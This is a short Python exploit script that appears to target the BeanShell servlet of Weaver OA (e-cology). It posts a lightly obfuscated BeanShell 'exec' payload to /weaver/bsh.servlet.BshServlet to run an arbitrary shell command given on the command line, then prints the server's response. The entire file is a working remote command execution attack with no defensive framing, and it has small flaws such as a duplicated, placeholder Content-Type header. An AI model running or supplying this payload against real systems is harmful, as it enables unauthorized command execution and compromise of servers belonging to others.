# !/usr/bin/python
# encoding:utf-8
import json
import requests
import sys
headers = {
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
        "Content-Type": "m.content_type",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Type":"application/x-www-form-urlencoded",

    }
url = sys.argv[1]
cmd = sys.argv[2]
attack_url = url + '/weaver/bsh.servlet.BshServlet'
postdata='bsh.script=eval%0d("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"/bin/bash\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&/bin/bash='+cmd.encode("utf-8")
r=requests.post(url=attack_url,data=postdata,headers=headers,verify=False)
print(r.text)
